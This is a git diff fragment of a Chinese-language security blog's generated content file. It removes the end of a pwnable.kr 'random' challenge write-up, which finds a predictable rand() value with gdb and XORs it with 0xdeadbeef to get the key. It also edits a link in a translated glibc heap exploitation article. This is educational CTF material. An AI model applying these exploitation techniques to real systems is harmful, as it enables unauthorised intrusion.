-<h4 id="在cmp处下断点"><a href="#在cmp处下断点" class="headerlink" title="在cmp处下断点"></a>在cmp处下断点</h4><p>汇编代码中，在进行cmp之前先进行了一次异或运算，显然这是将用户输入的key和生成的随机数进行异或，由此可以判断随机数的位置为$rbp-4$（先压入栈中），因此使用$x/10x \ $rbp-4$查看内存的值即可。</p>
-<p><strong><img src="/xiaohong404.github.io/2020/10/15/PWN/Pwnable_kr/random/6.png" class></strong></p>
-<p>所以生成的随机数为0x6b8b4567，可多次运行程序查看其值是否发生变化，这里不做演示。</p>
-<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p>求出$0x6b8b4567\oplus 0xdeadbeef$的值输入即可</p>
-<p><strong><img src="/xiaohong404.github.io/2020/10/15/PWN/Pwnable_kr/random/7.png" class></strong></p>
 ]]></content>
       <categories>
         <category>PWN</category>
@@ -925,7 +1019,7 @@
     <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/17/PWN/Heap/Heap-II/0.png" class></strong></p>
  <a id="more"></a>
 
-<p>[<a href="https://azeria-labs.com/heap-exploitation-part-2-glibc-heap-free-bins/">原版传送门</a>]</p>
+<p><a href="https://azeria-labs.com/heap-exploitation-part-2-glibc-heap-free-bins/">原版传送门</a></p>
 <h3 id="UNDERSTANDING-THE-GLIBC-HEAP-IMPLEMENTATION"><a href="#UNDERSTANDING-THE-GLIBC-HEAP-IMPLEMENTATION" class="headerlink" title="UNDERSTANDING THE GLIBC HEAP IMPLEMENTATION"></a><strong>UNDERSTANDING THE GLIBC HEAP IMPLEMENTATION</strong></h3><p>前一部分解释了<a href="https://linux.die.net/man/3/malloc"><em>malloc</em></a>和<a href="https://linux.die.net/man/3/free"><em>free</em></a>的基本行为。我们看到，<em>malloc</em>通过分配内存块来处理内存分配请求<em>。</em>每个块不仅存储程序员将与之交互的malloc返回的“用户数据”区域，还存储与该块关联的元数据。</p>
 <p><strong><img src="/xiaohong404.github.io/2020/10/17/PWN/Heap/Heap-II/1.png" class></strong></p>
 <p>我们看到了堆管理器的基本块分配策略是如何工作的，并且看到了当没有已经释放的块可以被用于响应用户的请求时，如何从堆的顶部创建新块。</p>
